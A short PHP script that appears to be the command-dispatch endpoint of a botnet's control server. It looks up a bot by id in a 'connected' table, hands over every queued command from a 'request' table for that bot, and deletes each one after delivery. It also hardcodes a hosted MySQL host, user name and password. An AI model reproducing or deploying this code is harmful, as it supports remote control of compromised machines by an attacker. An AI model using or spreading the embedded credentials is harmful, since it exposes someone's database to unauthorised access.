<?php

try
{
    $db = new PDO('mysql:host=mysql-nonameufr.alwaysdata.net;dbname=nonameufr_db;charset=utf8', 'nonameufr', 'always*');
}
catch (Exception $e)
{
    $errlog = fopen('log/err.log', 'a');
    if($errlog == FALSE)
    {
        die("file error");
    }
    fputs($errlog, "[" . date("D d/m/Y, H:i:s") . "] Error : " . $e->getMessage() . "\n");
    fclose($errlog);
    die('error');
}

if(!isset($_GET['id']))
{
	die("error\\\\too few arguments");
}

$id = (int) $_GET['id'];

$query = $db->prepare('SELECT * FROM connected WHERE id=:id');
$query->execute(array(
	'id' => $id
));

$res = $query->fetch();
if($res == FALSE)
{
	die('error\\\\no bots with id ' . $id);
}

$query = $db->prepare('SELECT * FROM request WHERE bot_id=:bot_id');
$query->execute(array(
	'bot_id' => $id
));

$request = $query->fetch();
if($request == FALSE)
{
	$query->closeCursor();
	die('no-request');
}
while($request != FALSE)
{
	echo $request['request'] . "\3";

	//$request = $query->fetch(); //temp
	//continue; //temp

	$del = $db->prepare('DELETE FROM request WHERE id=:id');
	$del->execute(array(
		'id' => $request['id']
	));

	$request = $query->fetch();
}
$query->closeCursor();

?>